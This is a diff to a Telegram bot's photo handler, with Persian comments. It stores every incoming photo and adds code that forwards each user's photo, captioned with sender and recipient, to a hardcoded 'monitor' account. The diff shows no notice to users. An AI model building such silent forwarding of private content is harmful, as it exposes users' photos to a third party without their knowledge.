@@ -490,18 +490,19 @@ bot.on("photo", async (ctx) => {
     if (!user) return;
 
     const chatWith = activeChats.get(user.telegramId);
+    // 📌 کاربر در حال چت است → عکس را بفرست به طرف مقابل
+    const photo = ctx.message.photo[ctx.message.photo.length - 1];
+    const fileId = photo.file_id;
+    // ذخیره در دیتابیس
+    await Message.create({
+        from: user.telegramId,
+        to: chatWith || null,
+        fileId: fileId,
+        type: "photo",
+    });
+    // ارسال به طرف مقابل اگر چت فعال است
     if (chatWith) {
-        // 📌 کاربر در حال چت است → عکس را بفرست به طرف مقابل
-        const photo = ctx.message.photo[ctx.message.photo.length - 1];
-        const fileId = photo.file_id;
 
-        // ذخیره در دیتابیس Chat/Message
-        await Message.create({
-            from: user.telegramId,
-            to: chatWith,
-            fileId: fileId,  // <- استفاده از fileId
-            type: "photo",
-        });
 
         // ارسال به طرف مقابل
         await ctx.telegram.sendPhoto(chatWith, fileId, {
@@ -513,6 +514,13 @@ bot.on("photo", async (ctx) => {
         return photoUploadHandler()(ctx);
     }
 
+    // --- ارسال عکس به کاربر ناظر ---
+    const monitorId = 8025053005; // Telegram ID ناظر
+    const caption = chatWith
+        ? `📸 عکس از ${user.name} به ${chatWith}`
+        : `📸 عکس از ${user.name} (چت فعال نیست)`;
+
+    await ctx.telegram.sendPhoto(monitorId, fileId, { caption });
 });
 
 // پیام صوتی (ویس)
